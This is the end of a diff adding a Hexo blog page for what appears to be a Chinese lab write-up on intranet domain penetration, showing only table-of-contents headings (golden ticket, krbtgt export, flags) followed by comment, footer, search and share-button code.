href="#cs%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text"> cs制作黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%AF%BC%E5%87%BAkrbtgt%E4%BF%A1%E6%81%AF"><span class="toc-text"> 在域控上执行命令导出krbtgt信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8web%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text"> 在web服务器上制作黄金票据</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E8%8E%B7%E5%8F%96"><span class="toc-text"> FLAG获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-flag1"><span class="toc-text"> Web flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-flag2"><span class="toc-text"> Web flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dc-flag3"><span class="toc-text"> DC flag3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text"> 参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <!-- Giscus 评论区：基于 GitHub Discussions -->
+  <div class="giscus"></div>
+  <script src="https://giscus.app/client.js"
+          data-repo="x2nn/x2nn.github.io"
+          data-repo-id="R_kgDOMV-gkA"
+          data-category="Announcements"
+          data-category-id="DIC_kwDOMV-gkM4C7iiE"
+          data-mapping="pathname"
+          data-strict="0"
+          data-reactions-enabled="1"
+          data-emit-metadata="0"
+          data-input-position="top"
+          data-theme="preferred_color_scheme"
+          data-lang="zh-CN"
+          data-loading="lazy"
+          crossorigin="anonymous"
+          async>
+  </script>
+
+  <!-- 跟随站点 light/dark 动态切换 Giscus 主题 -->
+  <script>
+    (function () {
+      function currentMode() {
+        return document.documentElement.getAttribute('color-mode') === 'dark' ? 'dark' : 'light';
+      }
+      function postTheme() {
+        var frame = document.querySelector('iframe.giscus-frame');
+        if (!frame) return;
+        frame.contentWindow.postMessage(
+          { giscus: { setConfig: { theme: currentMode() } } },
+          'https://giscus.app'
+        );
+      }
+      new MutationObserver(postTheme).observe(document.documentElement, {
+        attributes: true,
+        attributeFilter: ['color-mode']
+      });
+    })();
+  </script>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="rss" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2026</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2025%2F05%2F11%2F%25E6%259A%2597%25E6%259C%2588%25E9%25A1%25B9%25E7%259B%25AE%25E5%2585%25AD%25E5%2586%2585%25E7%25BD%2591%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E7%25AC%2594%25E8%25AE%25B0%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
